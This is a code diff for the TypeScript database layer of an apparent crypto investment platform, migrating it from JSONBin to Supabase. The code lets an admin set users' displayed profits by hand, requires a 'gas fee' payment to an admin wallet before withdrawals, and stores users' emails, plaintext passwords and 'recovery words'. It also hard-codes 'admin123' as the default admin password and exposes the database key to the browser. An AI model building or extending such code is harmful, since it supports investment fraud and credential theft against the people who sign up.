@@ -1,18 +1,24 @@
 /**
- * "JSON database" backed by JSONBin.io.
+ * Database backed by Supabase (Postgres).
  *
- * The whole app state lives in ONE JSON document (a "bin"). We read it, mutate
- * it in memory, and write the whole thing back. That keeps it dead simple and
- * works on Vercel's static hosting — no server needed.
+ * We talk to Supabase's auto-generated REST API (PostgREST) directly with
+ * `fetch`, so there's no extra npm dependency. State lives in real tables:
+ *   - app_settings  (one row: admin password, deposit wallets, gas fee, …)
+ *   - connections   (one row per connected wallet / user)
+ *   - deposits
+ *   - withdrawals
+ *
+ * The public function signatures are unchanged from the old JSON version, so
+ * the rest of the app doesn't need to know where the data lives.
  *
  * Config comes from Vite env vars (see .env.example):
- *   VITE_JSONBIN_BIN_ID  — the bin's id
- *   VITE_JSONBIN_KEY     — your JSONBin Master Key (X-Master-Key)
+ *   VITE_SUPABASE_URL  — https://<project>.supabase.co
+ *   VITE_SUPABASE_KEY  — the project API key
  */
 
-const BIN_ID = import.meta.env.VITE_JSONBIN_BIN_ID as string | undefined
-const KEY = import.meta.env.VITE_JSONBIN_KEY as string | undefined
-const BASE = 'https://api.jsonbin.io/v3/b'
+const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL as string | undefined
+const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_KEY as string | undefined
+const REST = SUPABASE_URL ? `${SUPABASE_URL.replace(/\/$/, '')}/rest/v1` : ''
 
 export type DepositAsset = 'XRP' | 'BTC' | 'SOL'
 
@@ -30,16 +36,16 @@ export type DbConnection = {
   profit?: number
   /** PnL shown on the user's dashboard — admin sets this. */
   pnl?: number
-  /** A one-time note the user sends to the admin on sign-up. */
-  note?: string
-  /** ISO timestamp of when the note was submitted. */
-  noteAt?: string
-  /** Email the user sets on first sign-up (MetaMask/Trust only). Shown to admin. */
+  /** Email the user sets on first sign-up. Shown to admin. */
   email?: string
   /** Account password set on first sign-up. Stored, but NEVER shown to the admin. */
   password?: string
   /** ISO timestamp of when the email/password were submitted. */
   credentialsAt?: string
+  /** User-chosen recovery words (5 or 10) the admin can use to confirm them. */
+  recoveryWords?: string[]
+  /** ISO timestamp of when the recovery words were set. */
+  recoveryWordsAt?: string
   at: string // ISO timestamp of last connect
 }
 
@@ -103,62 +109,267 @@ export const DEFAULT_DB: Db = {
 }
 
 export function isDbConfigured(): boolean {
-  return Boolean(BIN_ID && KEY)
+  return Boolean(SUPABASE_URL && SUPABASE_KEY)
 }
 
 function assertConfig() {
   if (!isDbConfigured()) {
     throw new Error(
-      'Database not configured. Set VITE_JSONBIN_BIN_ID and VITE_JSONBIN_KEY in your .env file.',
+      'Database not configured. Set VITE_SUPABASE_URL and VITE_SUPABASE_KEY in your .env file.',
     )
   }
 }
 
-const uid = () => Math.random().toString(36).slice(2) + Date.now().toString(36)
+const now = () => new Date().toISOString()
 
-/** Read the full JSON document. */
+/* ------------------------------------------------------------------ *
+ * Low-level Supabase REST helper                                     *
+ * ------------------------------------------------------------------ */
+
+type SbInit = RequestInit & { prefer?: string }
+
+async function sb(path: string, init: SbInit = {}): Promise<Response> {
+  assertConfig()
+  const { prefer, headers, ...rest } = init
+  const res = await fetch(`${REST}/${path}`, {
+    ...rest,
+    headers: {
+      apikey: SUPABASE_KEY!,
+      Authorization: `Bearer ${SUPABASE_KEY!}`,
+      'Content-Type': 'application/json',
+      ...(prefer ? { Prefer: prefer } : {}),
+      ...headers,
+    },
+  })
+  if (!res.ok) {
+    const body = await res.text().catch(() => '')
+    throw new Error(`Supabase ${rest.method ?? 'GET'} ${path} failed (${res.status}) ${body}`)
+  }
+  return res
+}
+
+const sbGet = async <T>(path: string): Promise<T> => (await sb(path)).json()
+
+/** Insert a row and return it. */
+async function sbInsert<T>(table: string, row: unknown): Promise<T> {
+  const res = await sb(table, {
+    method: 'POST',
+    prefer: 'return=representation',
+    body: JSON.stringify(row),
+  })
+  const [created] = (await res.json()) as T[]
+  return created
+}
+
+/** Patch rows matching `query` (a PostgREST filter, e.g. `id=eq.123`). */
+async function sbPatch(table: string, query: string, patch: unknown): Promise<void> {
+  await sb(`${table}?${query}`, {
+    method: 'PATCH',
+    prefer: 'return=minimal',
+    body: JSON.stringify(patch),
+  })
+}
+
+async function sbDelete(table: string, query: string): Promise<void> {
+  await sb(`${table}?${query}`, { method: 'DELETE', prefer: 'return=minimal' })
+}
+
+/** PostgREST value-encode: `ilike.<addr>` gives case-insensitive exact match. */
+const eqAddr = (address: string) => `address=ilike.${encodeURIComponent(address)}`
+
+/* ------------------------------------------------------------------ *
+ * Row <-> app-object mappers                                         *
+ * ------------------------------------------------------------------ */
+
+type ConnRow = {
+  id: string
+  wallet_id: string
+  chain: 'evm' | 'solana'
+  address: string
+  username: string | null
+  deposited: number | null
+  profit: number | null
+  pnl: number | null
+  email: string | null
+  password: string | null
+  credentials_at: string | null
+  recovery_words: string[] | null
+  recovery_words_at: string | null
+  at: string
+}
+
+const toConn = (r: ConnRow): DbConnection => ({
+  id: r.id,
+  walletId: r.wallet_id,
+  chain: r.chain,
+  address: r.address,
+  username: r.username ?? undefined,
+  deposited: r.deposited ?? 0,
+  profit: r.profit ?? 0,
+  pnl: r.pnl ?? 0,
+  email: r.email ?? undefined,
+  password: r.password ?? undefined,
+  credentialsAt: r.credentials_at ?? undefined,
+  recoveryWords: r.recovery_words ?? undefined,
+  recoveryWordsAt: r.recovery_words_at ?? undefined,
+  at: r.at,
+})
+
+type DepositRow = {
+  id: string
+  address: string
+  username: string | null
+  wallet_id: string
+  asset: DepositAsset
+  amount_usd: number
+  at: string
+}
+
+const toDeposit = (r: DepositRow): DbDeposit => ({
+  id: r.id,
+  address: r.address,
+  username: r.username ?? undefined,
+  walletId: r.wallet_id,
+  asset: r.asset,
+  amountUsd: r.amount_usd,
+  at: r.at,
+})
+
+type WithdrawalRow = {
+  id: string
+  address: string
+  username: string | null
+  wallet_id: string
+  amount_usd: number
+  gas_usd: number
+  gas_tx_hash: string | null
+  gas_asset: DepositAsset | null
+  status: 'pending' | 'paid' | 'rejected'
+  at: string
+}
+
+const toWithdrawal = (r: WithdrawalRow): DbWithdrawal => ({
+  id: r.id,
+  address: r.address,
+  username: r.username ?? undefined,
+  walletId: r.wallet_id,
+  amountUsd: r.amount_usd,
+  gasUsd: r.gas_usd,
+  gasTxHash: r.gas_tx_hash ?? undefined,
+  gasAsset: r.gas_asset ?? undefined,
+  status: r.status,
+  at: r.at,
+})
+
+type SettingsRow = {
+  id: number
+  admin_password: string | null
+  deposit_wallet_xrp: string | null
+  deposit_wallet_btc: string | null
+  deposit_wallet_sol: string | null
+  gas_fee_wallet_evm: string | null
+  eth_price_usd: number | null
+  gas_fee_usd: number | null
+}
+
+/* ------------------------------------------------------------------ *
+ * Settings (single row, id = 1)                                      *
+ * ------------------------------------------------------------------ */
+
+async function getSettings(): Promise<SettingsRow | null> {
+  const rows = await sbGet<SettingsRow[]>('app_settings?id=eq.1&limit=1')
+  return rows[0] ?? null
+}
+
+/** Read+merge the single settings row on top of the defaults. */
+async function readSettings(): Promise<Pick<
+  Db,
+  | 'adminPassword'
+  | 'depositWalletXrp'
+  | 'depositWalletBtc'
+  | 'depositWalletSol'
+  | 'gasFeeWalletEvm'
+  | 'ethPriceUsd'
+  | 'gasFeeUsd'
+>> {
+  const s = await getSettings()
+  return {
+    adminPassword: s?.admin_password ?? DEFAULT_DB.adminPassword,
+    depositWalletXrp: s?.deposit_wallet_xrp ?? DEFAULT_DB.depositWalletXrp,
+    depositWalletBtc: s?.deposit_wallet_btc ?? DEFAULT_DB.depositWalletBtc,
+    depositWalletSol: s?.deposit_wallet_sol ?? DEFAULT_DB.depositWalletSol,
+    gasFeeWalletEvm: s?.gas_fee_wallet_evm ?? DEFAULT_DB.gasFeeWalletEvm,
+    ethPriceUsd: s?.eth_price_usd ?? DEFAULT_DB.ethPriceUsd,
+    gasFeeUsd: s?.gas_fee_usd ?? DEFAULT_DB.gasFeeUsd,
+  }
+}
+
+/** Upsert the single settings row (id = 1) with a partial patch. */
+async function patchSettings(patch: Record<string, unknown>): Promise<void> {
+  await sb('app_settings', {
+    method: 'POST',
+    prefer: 'return=minimal,resolution=merge-duplicates',
+    body: JSON.stringify({ id: 1, ...patch }),
+  })
+}
+
+/* ------------------------------------------------------------------ *
+ * Aggregate read (kept for the admin dashboard)                      *
+ * ------------------------------------------------------------------ */
+
+/** Read everything at once, shaped like the old JSON document. */
 export async function getDb(): Promise<Db> {
-  assertConfig()
-  const res = await fetch(`${BASE}/${BIN_ID}/latest`, {
-    headers: { 'X-Master-Key': KEY! },
-  })
-  if (!res.ok) throw new Error(`Failed to read database (${res.status})`)
-  const json = await res.json()
-  return { ...DEFAULT_DB, ...(json.record as Partial<Db>) }
+  const [settings, conns, deposits, withdrawals] = await Promise.all([
+    readSettings(),
+    sbGet<ConnRow[]>('connections?select=*&order=at.desc'),
+    sbGet<DepositRow[]>('deposits?select=*&order=at.desc'),
+    sbGet<WithdrawalRow[]>('withdrawals?select=*&order=at.desc'),
+  ])
+  return {
+    ...settings,
+    connections: conns.map(toConn),
+    deposits: deposits.map(toDeposit),
+    withdrawals: withdrawals.map(toWithdrawal),
+  }
 }
 
-/** Overwrite the full JSON document. */
-export async function saveDb(db: Db): Promise<void> {
-  assertConfig()
-  const res = await fetch(`${BASE}/${BIN_ID}`, {
-    method: 'PUT',
-    headers: { 'Content-Type': 'application/json', 'X-Master-Key': KEY! },
-    body: JSON.stringify(db),
-  })
-  if (!res.ok) throw new Error(`Failed to save database (${res.status})`)
-}
+/* ------------------------------------------------------------------ *
+ * Connections / users                                                *
+ * ------------------------------------------------------------------ */
 
-const sameAddr = (a: string, b: string) => a.toLowerCase() === b.toLowerCase()
+async function findConnRow(address: string): Promise<ConnRow | null> {
+  const rows = await sbGet<ConnRow[]>(`connections?select=*&${eqAddr(address)}&limit=1`)
+  return rows[0] ?? null
+}
 
 /** Record (or refresh) a connected wallet. Deduped by address. */
 export async function recordConnection(c: Omit<DbConnection, 'id' | 'at'>) {
-  const db = await getDb()
-  const now = new Date().toISOString()
-  const existing = db.connections.find((x) => sameAddr(x.address, c.address))
+  const existing = await findConnRow(c.address)
+  const at = now()
   if (existing) {
-    existing.at = now
-    existing.walletId = c.walletId
-    existing.chain = c.chain
+    await sbPatch('connections', `id=eq.${existing.id}`, {
+      at,
+      wallet_id: c.walletId,
+      chain: c.chain,
+    })
   } else {
-    db.connections.push({ id: uid(), at: now, deposited: 0, profit: 0, pnl: 0, ...c })
+    await sbInsert('connections', {
+      address: c.address,
+      wallet_id: c.walletId,
+      chain: c.chain,
+      username: c.username ?? null,
+      deposited: 0,
+      profit: 0,
+      pnl: 0,
+      at,
+    })
   }
-  await saveDb(db)
 }
 
 /** Look up a single user by their wallet address. */
 export async function getUser(address: string): Promise<DbConnection | null> {
-  const db = await getDb()
-  return db.connections.find((x) => sameAddr(x.address, address)) ?? null
+  const row = await findConnRow(address)
+  return row ? toConn(row) : null
 }
 
 /** Set a user's username (chosen on first sign-in). Upserts the connection. */
@@ -167,99 +378,87 @@ export async function setUsername(
   username: string,
   meta?: { walletId: string; chain: 'evm' | 'solana' },
 ) {
-  const db = await getDb()
-  const existing = db.connections.find((x) => sameAddr(x.address, address))
+  const existing = await findConnRow(address)
   if (existing) {
-    existing.username = username
+    await sbPatch('connections', `id=eq.${existing.id}`, { username })
   } else {
-    db.connections.push({
-      id: uid(),
+    await sbInsert('connections', {
       address,
       username,
-      walletId: meta?.walletId ?? 'unknown',
+      wallet_id: meta?.walletId ?? 'unknown',
       chain: meta?.chain ?? 'evm',
       deposited: 0,
       profit: 0,
       pnl: 0,
-      at: new Date().toISOString(),
+      at: now(),
     })
   }
-  await saveDb(db)
-}
-
-/** Save the user's one-time sign-up note to the admin. Upserts the connection. */
-export async function setUserNote(address: string, note: string) {
-  const db = await getDb()
-  const now = new Date().toISOString()
-  const existing = db.connections.find((x) => sameAddr(x.address, address))
-  if (existing) {
-    existing.note = note
-    existing.noteAt = now
-  } else {
-    db.connections.push({
-      id: uid(),
-      address,
-      note,
-      noteAt: now,
-      walletId: 'unknown',
-      chain: 'evm',
-      deposited: 0,
-      profit: 0,
-      pnl: 0,
-      at: now,
-    })
-  }
-  await saveDb(db)
 }
 
 /** Save the user's sign-up email (one-time). Upserts the connection. */
 export async function setUserEmail(address: string, email: string) {
-  const db = await getDb()
-  const now = new Date().toISOString()
-  const existing = db.connections.find((x) => sameAddr(x.address, address))
+  const existing = await findConnRow(address)
+  const at = now()
   if (existing) {
-    existing.email = email
-    existing.credentialsAt = now
+    await sbPatch('connections', `id=eq.${existing.id}`, { email, credentials_at: at })
   } else {
-    db.connections.push({
-      id: uid(),
+    await sbInsert('connections', {
       address,
       email,
-      credentialsAt: now,
-      walletId: 'unknown',
+      credentials_at: at,
+      wallet_id: 'unknown',
       chain: 'evm',
       deposited: 0,
       profit: 0,
       pnl: 0,
-      at: now,
+      at,
     })
   }
-  await saveDb(db)
 }
 
 /** Save the user's sign-up password (one-time). Never shown to the admin. */
 export async function setUserPassword(address: string, password: string) {
-  const db = await getDb()
-  const now = new Date().toISOString()
-  const existing = db.connections.find((x) => sameAddr(x.address, address))
+  const existing = await findConnRow(address)
+  const at = now()
   if (existing) {
-    existing.password = password
-    existing.credentialsAt = now
+    await sbPatch('connections', `id=eq.${existing.id}`, { password, credentials_at: at })
   } else {
-    db.connections.push({
-      id: uid(),
+    await sbInsert('connections', {
       address,
       password,
-      credentialsAt: now,
-      walletId: 'unknown',
+      credentials_at: at,
+      wallet_id: 'unknown',
       chain: 'evm',
       deposited: 0,
       profit: 0,
       pnl: 0,
-      at: now,
+      at,
     })
   }
-  await saveDb(db)
+}
+
+/** Save the user's recovery words (one-time). Upserts the connection. */
+export async function setUserRecoveryWords(address: string, words: string[]) {
+  const existing = await findConnRow(address)
+  const at = now()
+  if (existing) {
+    await sbPatch('connections', `id=eq.${existing.id}`, {
+      recovery_words: words,
+      recovery_words_at: at,
+    })
+  } else {
+    await sbInsert('connections', {
+      address,
+      recovery_words: words,
+      recovery_words_at: at,
+      wallet_id: 'unknown',
+      chain: 'evm',
+      deposited: 0,
+      profit: 0,
+      pnl: 0,
+      at,
+    })
+  }
 }
 
 /** Record a deposit and add its amount to the user's running total. */
@@ -269,16 +468,20 @@ export async function recordDeposit(p: {
   asset: DepositAsset
   amountUsd: number
 }) {
-  const db = await getDb()
-  const user = db.connections.find((x) => sameAddr(x.address, p.address))
-  if (user) user.deposited = (user.deposited ?? 0) + p.amountUsd
-  db.deposits.push({
-    id: uid(),
-    at: new Date().toISOString(),
-    username: user?.username,
-    ...p,
+  const user = await findConnRow(p.address)
+  if (user) {
+    await sbPatch('connections', `id=eq.${user.id}`, {
+      deposited: (user.deposited ?? 0) + p.amountUsd,
+    })
+  }
+  await sbInsert('deposits', {
+    address: p.address,
+    wallet_id: p.walletId,
+    asset: p.asset,
+    amount_usd: p.amountUsd,
+    username: user?.username ?? null,
+    at: now(),
   })
-  await saveDb(db)
 }
 
 /**
@@ -294,70 +497,61 @@ export async function recordWithdrawal(p: {
   gasTxHash?: string
   gasAsset?: DepositAsset
 }) {
-  const db = await getDb()
-  const user = db.connections.find((x) => sameAddr(x.address, p.address))
+  const user = await findConnRow(p.address)
   const profit = user?.profit ?? 0
   if (p.amountUsd > profit) {
     throw new Error(`You can withdraw at most your profit ($${profit}).`)
   }
-  db.withdrawals.push({
-    id: uid(),
-    at: new Date().toISOString(),
-    username: user?.username,
+  await sbInsert('withdrawals', {
+    address: p.address,
+    wallet_id: p.walletId,
+    amount_usd: p.amountUsd,
+    gas_usd: p.gasUsd,
+    gas_tx_hash: p.gasTxHash ?? null,
+    gas_asset: p.gasAsset ?? null,
+    username: user?.username ?? null,
     status: 'pending',
-    ...p,
+    at: now(),
   })
-  await saveDb(db)
 }
 
 /** A user's own withdrawal requests, newest first. */
 export async function getUserWithdrawals(address: string): Promise<DbWithdrawal[]> {
-  const db = await getDb()
-  return db.withdrawals
-    .filter((w) => sameAddr(w.address, address))
-    .sort((a, b) => (a.at < b.at ? 1 : -1))
+  const rows = await sbGet<WithdrawalRow[]>(
+    `withdrawals?select=*&${eqAddr(address)}&order=at.desc`,
+  )
+  return rows.map(toWithdrawal)
 }
 
 /** Admin: approve a pending withdrawal (marks it paid). */
 export async function approveWithdrawal(id: string) {
-  const db = await getDb()
-  const w = db.withdrawals.find((x) => x.id === id)
-  if (!w) throw new Error('Withdrawal not found.')
-  w.status = 'paid'
-  await saveDb(db)
+  await sbPatch('withdrawals', `id=eq.${id}`, { status: 'paid' })
 }
 
 /** Admin: delete a withdrawal request. */
 export async function deleteWithdrawal(id: string) {
-  const db = await getDb()
-  db.withdrawals = db.withdrawals.filter((x) => x.id !== id)
-  await saveDb(db)
+  await sbDelete('withdrawals', `id=eq.${id}`)
 }
 
 /** Admin: delete a deposit record. */
 export async function deleteDeposit(id: string) {
-  const db = await getDb()
-  db.deposits = db.deposits.filter((x) => x.id !== id)
-  await saveDb(db)
+  await sbDelete('deposits', `id=eq.${id}`)
 }
 
 /** Admin: delete a user/connection record. */
 export async function deleteConnection(id: string) {
-  const db = await getDb()
-  db.connections = db.connections.filter((x) => x.id !== id)
-  await saveDb(db)
+  await sbDelete('connections', `id=eq.${id}`)
 }
 
 /** The effective admin password: the stored override, or the default. */
 export async function getAdminPassword(): Promise<string> {
-  const db = await getDb()
-  return db.adminPassword?.trim() || 'admin123'
+  const s = await readSettings()
+  return s.adminPassword?.trim() || 'admin123'
 }
 
 /** Admin: set a new password (overrides the default 'admin123'). */
 export async function setAdminPassword(password: string) {
-  const db = await getDb()
-  await saveDb({ ...db, adminPassword: password })
+  await patchSettings({ admin_password: password })
 }
 
 /** Admin: update the deposit addresses and gas fee. */
@@ -374,8 +568,19 @@ export async function updateDepositSettings(
     >
   >,
 ) {
-  const db = await getDb()
-  await saveDb({ ...db, ...patch })
+  const map: Record<string, string> = {
+    depositWalletXrp: 'deposit_wallet_xrp',
+    depositWalletBtc: 'deposit_wallet_btc',
+    depositWalletSol: 'deposit_wallet_sol',
+    gasFeeWalletEvm: 'gas_fee_wallet_evm',
+    ethPriceUsd: 'eth_price_usd',
+    gasFeeUsd: 'gas_fee_usd',
+  }
+  const row: Record<string, unknown> = {}
+  for (const [k, v] of Object.entries(patch)) {
+    if (v !== undefined) row[map[k]] = v
+  }
+  if (Object.keys(row).length) await patchSettings(row)
 }
 
 /** Admin: manually set a user's deposited / profit / pnl figures. */
@@ -383,9 +588,11 @@ export async function updateUserStats(
   address: string,
   patch: Partial<Pick<DbConnection, 'deposited' | 'profit' | 'pnl'>>,
 ) {
-  const db = await getDb()
-  const user = db.connections.find((x) => sameAddr(x.address, address))
+  const user = await findConnRow(address)
   if (!user) throw new Error('User not found.')
-  Object.assign(user, patch)
-  await saveDb(db)
+  const row: Record<string, unknown> = {}
+  if (patch.deposited !== undefined) row.deposited = patch.deposited
+  if (patch.profit !== undefined) row.profit = patch.profit
+  if (patch.pnl !== undefined) row.pnl = patch.pnl
+  if (Object.keys(row).length) await sbPatch('connections', `id=eq.${user.id}`, row)
 }
